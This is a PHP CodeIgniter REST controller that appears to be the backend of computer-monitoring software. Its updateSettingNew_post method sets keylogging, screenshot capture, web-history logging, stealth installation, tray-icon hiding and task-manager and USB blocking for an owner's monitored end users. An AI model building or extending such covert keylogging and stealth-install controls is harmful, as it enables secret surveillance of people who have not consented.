<?php
use Restserver\Libraries\REST_Controller;
defined('BASEPATH') OR exit('No direct script access allowed');

// This can be removed if you use __autoload() in config.php OR use Modular Extensions
/** @noinspection PhpIncludeInspection */
//To Solve File REST_Controller not found
require APPPATH . 'libraries/REST_Controller.php';
require APPPATH . 'libraries/Format.php';

/**
 * This is an example of a few basic user interaction methods you could use
 * all done with a hardcoded array
 *
 * @package         CodeIgniter
 * @subpackage      Rest Server
 * @category        Controller
 * @author          Phil Sturgeon, Chris Kacerguis
 * @license         MIT
 * @link            https://github.com/chriskacerguis/codeigniter-restserver
 */
class Ed extends REST_Controller {

    function __construct()
    {
        // Construct the parent class
        parent::__construct();
        session_start();
        // Configure limits on our controller methods
        // Ensure you have created the 'limits' table and enabled 'limits' within application/config/rest.php
        $this->load->model('ed_model');
    }

    public function filterfeeds_post()
    {
       $this->ed_model->filterfeeds();
    }
    public function getPaymentHistory_post()
    {
        $this->ed_model->getPaymentHistory();
    }
    public function getOwnerUsedLicense_post()
    {
        $this->ed_model->getOwnerUsedLicense();
    }
    public function countGallery_get()
    {
        $this->ed_model->countGallery();
    }
    public function login_post()
    {
        $this->ed_model->login();
    }
    public function getfeeds_post()
    {
        $this->ed_model->getFeeds();
    }
    public function getendusers_post()
    {
        $this->ed_model->getEndUsers();
    }
    public function nexttworec_post()
    {
        $this->ed_model->nexttworec();
    }
    public function prevtworec_post()
    {
        $this->ed_model->prevtworec();
    }
    public function changepassword_post()
    {
        $this->ed_model->changeOwnerPassword();
    }
    public function getwatchlist_post()
    {
        $this->ed_model->getWatchlist();
    }
    public function getSnapshotImage_post()
    {
        $this->ed_model->getSnapshotImage();
    }
    public function getOnDemandSnapshot_post()
    {
        $this->ed_model->getOnDemandSnapshot();
    }
    public function edituserdet_post()
    {
        $this->ed_model->EditUserDet();
    }
    public function addNote_post()
    {
        $this->ed_model->addNote();
    }
    public function deleteFeed_post()
    {
        $this->ed_model->deleteFeed();
    }
    public function deleteUser_post()
    {
        $this->ed_model->deleteUser();
    }
    public function nextprevimage_post()
    {
        $this->ed_model->NextPrevImage();
    }
    public function enactivatelicense_post()
    {
        $this->ed_model->enActivateLicense();
    }
     public function enuserdetails_post()
    {
        $this->ed_model->enUserDetails();
    }
    public function encryptRJ256_get()
    {
        $this->ed_model->encryptRJ256();
    }
    public function getuserstatus_post()
    {
        $this->ed_model->getUserStatus();
    }
    public function deleteAll_post()
    {
        $this->ed_model->enOwnerDeleteContent();
    }
    public function getSettings_post()
    {
        $this->ed_model->getSettings();
    }
    public function updateSettings_post()
    {
        $this->ed_model->updateSettings();
    }
    public function savePin_post()
    {
        $this->ed_model->savePin();
    }
    public function getLicenseDet_post()
    {
        $this->ed_model->getLicense();
    }
    public function promocode_post()
    {
        $promocode = $this->ed_model->promocode();
    }
    public function getOwnerTrasactionDet_post()
    {
        $this->ed_model->getOwnerTrasactionDet();
    }

    public function updateSettingNew_post() {
        $str_data = file_get_contents("php://input"); //read the HTTP body.
        $decode = json_decode($str_data, true);
        if(isset($_SESSION["ownerid"])) {
            if(urldecode($decode['flag']) == "1") { //Global
                $data = array(
                    'screenshot' => urldecode($decode['screenShot']),
                    'trayicon' => urldecode($decode['trayIcon']),
                    'keylog' => urldecode($decode['keyLogs']),
                    'webhistory' => urldecode($decode['webHistory']),
                    'stealthinstall' => urldecode($decode['install']),
                    'pause' => urldecode($decode['pause']),
                    'usbblock' => urldecode($decode['usbBlock']),
                    'taskmanagerblock' => urldecode($decode['taskM']),
                    'screenshotinterval' => urldecode($decode['screenShotTimer']),
                    'lazyminutes' => urldecode($decode['lazyMinutesTimer'])
                );
        		$this->db->update('U_endowners', $data, array('sno' => $_SESSION["ownerid"]));
            } else if(urldecode($decode['flag']) == "2") { //Global and all users
                $data = array(
                    'screenshot' => urldecode($decode['screenShot']),
                    'trayicon' => urldecode($decode['trayIcon']),
                    'keylog' => urldecode($decode['keyLogs']),
                    'webhistory' => urldecode($decode['webHistory']),
                    'stealthinstall' => urldecode($decode['install']),
                    'pause' => urldecode($decode['pause']),
                    'usbblock' => urldecode($decode['usbBlock']),
                    'taskmanagerblock' => urldecode($decode['taskM']),
                    'screenshotinterval' => urldecode($decode['screenShotTimer']),
                    'lazyminutes' => urldecode($decode['lazyMinutesTimer'])
                );
        		$this->db->update('U_endowners', $data, array('sno' => $_SESSION["ownerid"]));

                $data_2 = array(
                    'screenshot' => urldecode($decode['screenShot']),
                    'trayicon' => urldecode($decode['trayIcon']),
                    'keylog' => urldecode($decode['keyLogs']),
                    'webhistory' => urldecode($decode['webHistory']),
                    'stealthinstall' => urldecode($decode['install']),
                    'pause' => urldecode($decode['pause']),
                    'usbblock' => urldecode($decode['usbBlock']),
                    'taskmanagerblock' => urldecode($decode['taskM']),
                    'screenshot_interval' => urldecode($decode['screenShotTimer']),
                    'lazyminutes' => urldecode($decode['lazyMinutesTimer'])
                );
                $this->db->update('U_endusers', $data_2, array('ownerid' => $_SESSION["ownerid"]));
            } else if(urldecode($decode['flag']) == "3") { //only one user
                $data = array(
                    'screenshot' => urldecode($decode['screenShot']),
                    'trayicon' => urldecode($decode['trayIcon']),
                    'keylog' => urldecode($decode['keyLogs']),
                    'webhistory' => urldecode($decode['webHistory']),
                    'stealthinstall' => urldecode($decode['install']),
                    'pause' => urldecode($decode['pause']),
                    'usbblock' => urldecode($decode['usbBlock']),
                    'taskmanagerblock' => urldecode($decode['taskM']),
                    'screenshot_interval' => urldecode($decode['screenShotTimer']),
                    'lazyminutes' => urldecode($decode['lazyMinutesTimer'])
                );

                $eid = urldecode($decode['eid']);
        		$this->db->update('U_endusers', $data, array('sno' => $eid, 'ownerid' => $_SESSION["ownerid"]));
            }


            echo '1';
        } else {
            echo 'Error Session';
        }
    }
}
